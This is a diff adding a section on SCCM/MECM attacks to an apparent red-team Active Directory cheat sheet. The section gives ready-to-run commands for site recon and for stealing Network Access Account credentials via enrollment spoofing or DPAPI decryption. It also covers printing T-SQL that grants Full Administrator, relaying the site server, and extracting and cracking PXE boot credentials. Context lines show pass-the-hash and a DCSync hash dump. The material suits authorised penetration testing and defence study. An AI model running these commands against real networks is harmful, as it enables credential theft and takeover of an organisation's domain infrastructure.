@@ -487,6 +487,40 @@ nxc smb <dc-ip> -u administrator -H <NThash> -d <domain>
 ////////////////////////////////////////
 
 
+SCCM / MECM — site takeover & NAA/PXE creds
+++++++++++++++++++++++++++++++++++++++++
+# SCCM/MECM is domain-integrated infra with three credential/escalation paths: recover the
+# Network Access Account, coerce/relay the site server, or crack a PXE boot image. sccmhunter
+# (garrettfoster13, @unsigned_sh0rt) drives the first two from Linux. Binary is sccmhunter.py,
+# NOT a bare `sccmhunter` — see install/offensive-packages.txt for the pipx-git install.
+# 1) DISCOVER — LDAP recon for site servers, Management Points, PXE-enabled DPs, SCCM/MECM names:
+python3 sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <ip_address>
+python3 sccmhunter.py smb  -u <user> -p <password> -d <domain> -dc-ip <ip_address> -save   # profile roles, save to local DB
+python3 sccmhunter.py show -siteservers                                                    # read back what profiling found
+
+# 2) NAA CREDS — two routes. Over the network by spoofing client enrollment against a MP
+# (Adam Chester's sccmwtf; no client compromise needed):
+python3 sccmhunter.py http -u <user> -p <password> -d <domain> -dc-ip <ip_address> -auto
+# ...or from an already-compromised SCCM client, decrypting the DPAPI-protected policy blob:
+python3 sccmhunter.py dpapi -u <user> -p <password> -d <domain> -target <client-host> -wmi   # -disk / -both also
+# The NAA is a domain account SCCM uses to reach content — often over-privileged. Spray it with nxc.
+
+# 3) SITE TAKEOVER — mssql module prints the T-SQL to add yourself as a Full Administrator
+# (@_Mayyhem's research); needs a path to the site DB (SQL admin, or relay the site server):
+python3 sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <ip_address> -tu <target-user> -sc <site-code>
+# Coercion feeds this: the site server can be coerced (coercer/PetitPotam) and RELAYED to the
+# site DB or to AD CS (ESC8) — same relay chain as the fold above, SCCM as the victim.
+
+# 4) PXE CREDS — a PXE-enabled DP (found in step 1) serves a password-protected boot media
+# variables file over TFTP. pxethiefy (csandker) pulls it from the attacker box (-i is the
+# INTERFACE to discover on, -a targets a known DP's IP; needs CAP_NET_RAW — hence sudo):
+sudo python3 pxethiefy.py explore -a <dp-ip>         # or: -i <iface> to discover DPs on the segment
+# The auto-derived blank-password blob cracks with hashcat -m 19850 (SCCM PXE) against rockyou;
+# feed the cracked password back to decrypt the task-sequence variables (domain-join / NAA creds):
+python3 pxethiefy.py decrypt -p "<cracked-pw>" -f <downloaded>.boot.var
+////////////////////////////////////////
+
+
 DCSync / NTDS dump (needs DA or replication rights)
 ++++++++++++++++++++++++++++++++++++++++
 impacket-secretsdump <domain>/<user>:<password>@<dc-ip> -just-dc              # all domain hashes
